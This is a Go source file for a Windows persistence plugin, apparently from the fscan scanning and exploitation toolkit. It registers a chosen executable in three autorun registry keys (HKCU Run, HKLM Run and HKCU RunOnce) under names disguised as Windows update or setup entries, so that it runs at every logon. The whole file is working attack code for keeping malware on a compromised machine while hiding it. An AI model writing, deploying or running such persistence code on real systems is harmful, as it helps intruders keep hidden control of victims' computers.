//go:build (plugin_winregistry || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type WinRegistryPlugin struct {
	plugins.BasePlugin
}

func NewWinRegistryPlugin() *WinRegistryPlugin {
	return &WinRegistryPlugin{
		BasePlugin: plugins.NewBasePlugin("winregistry"),
	}
}

func (p *WinRegistryPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.WinPEFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.GetText("local_pe_not_specified"))}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: fmt.Errorf("%s", i18n.Tr("local_pe_not_found", pePath))}
	}

	absPath, _ := filepath.Abs(pePath)
	baseName := strings.TrimSuffix(filepath.Base(absPath), filepath.Ext(absPath))

	entries := []struct {
		key  string
		name string
		desc string
	}{
		{`HKCU\Software\Microsoft\Windows\CurrentVersion\Run`, fmt.Sprintf("WindowsUpdate_%s", baseName), i18n.GetText("winregistry_current_user_run")},
		{`HKLM\Software\Microsoft\Windows\CurrentVersion\Run`, fmt.Sprintf("SystemUpdate_%s", baseName), i18n.GetText("winregistry_local_machine_run")},
		{`HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`, fmt.Sprintf("SetupComplete_%s", baseName), i18n.GetText("winregistry_current_user_runonce")},
	}

	var output strings.Builder
	var successCount int

	for _, e := range entries {
		out, err := exec.Command("reg", "add", e.key, "/v", e.name, "/t", "REG_SZ", "/d", absPath, "/f").CombinedOutput()
		if err != nil {
			output.WriteString(i18n.Tr("local_step_failed", e.desc, strings.TrimSpace(string(out))) + "\n")
			continue
		}
		output.WriteString(i18n.Tr("winregistry_step_success", e.desc, e.key, e.name) + "\n")
		successCount++
	}

	if successCount > 0 {
		session.LogSuccess(i18n.Tr("winregistry_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func init() {
	RegisterLocalPlugin("winregistry", func() Plugin {
		return NewWinRegistryPlugin()
	})
}
